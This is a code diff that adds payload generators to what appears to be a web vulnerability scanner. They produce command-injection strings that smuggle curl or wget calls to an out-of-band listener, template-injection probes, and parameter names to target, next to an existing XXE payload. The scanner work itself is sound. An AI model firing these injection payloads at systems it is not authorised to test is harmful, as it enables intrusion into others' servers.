@@ -25,6 +25,23 @@ MASS_ASSIGN_FIELDS = {
 }
 
 
+def cmdi_payloads(oob_url: str) -> list[str]:
+    """Command-injection payloads that call back to our listener (OOB-confirmed)."""
+    return [f";curl {oob_url}", f"|curl {oob_url}", f"$(curl {oob_url})",
+            f"`curl {oob_url}`", f"; wget -qO- {oob_url}", f"&& curl {oob_url}"]
+
+
+# SSTI probes across common engines; the response should contain MARKER+"49".
+def ssti_payloads(marker: str) -> list[str]:
+    return [f"{marker}{{{{7*7}}}}", f"{marker}${{7*7}}", f"{marker}#{{7*7}}",
+            f"{marker}<%= 7*7 %>", f"{marker}{{7*7}}"]
+
+
+def candidate_params(existing: list[str]) -> list[str]:
+    """Parameter names to inject into: the existing ones, or common defaults."""
+    return existing or ["q", "name", "search", "id", "input", "query", "s"]
+
+
 def xxe_payload(oob_url: str) -> str:
     """An XML body whose external entity points at our listener."""
     return (f'<?xml version="1.0"?>\n'
